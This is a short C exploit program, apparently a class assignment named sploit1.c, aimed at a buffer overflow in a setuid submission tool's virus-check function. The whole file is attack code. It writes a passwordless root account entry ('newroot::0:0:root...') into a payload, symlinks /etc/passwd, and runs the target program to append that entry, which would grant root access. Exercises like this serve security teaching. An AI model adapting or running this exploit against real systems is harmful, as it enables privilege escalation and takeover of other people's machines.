/*
 * sploit1.c
 * buffer overflow version, attack the check_for_viruses function
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>

//#define TARGET "/usr/local/bin/submitV2" // or submitV2
#define TARGET "/share/submit"   // for testing only

int main() {
    FILE *fp;
	char *args[4];
	char *env[1];

	unsigned char argbuf[4017]; 

	char *ptr;

    // create the argbuf
    memset(argbuf, ' ', sizeof(unsigned char)*4016);

    ptr = argbuf + 984;
    memcpy(ptr, "newroot::0:0:root:/root:/bin/bash", strlen("newroot::0:0:root:/root:/bin/bash"));


    fp = fopen("passwd", "wb");
    fwrite(argbuf, 1, sizeof(argbuf), fp);
    fclose(fp);


    //system("echo 'newroot::0:0:root:/root:/bin/bash' >> passwd");
	
    
	symlink("/etc/passwd", "passwd");
	args[0] = TARGET;
	args[1] = "././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././passwd"; 
    args[2] = NULL;
    args[3] = NULL;

	env[0] = NULL;

	execve(TARGET, args, env);
    fprintf(stderr, "execve failed\n");
    

	
	return 1;
}
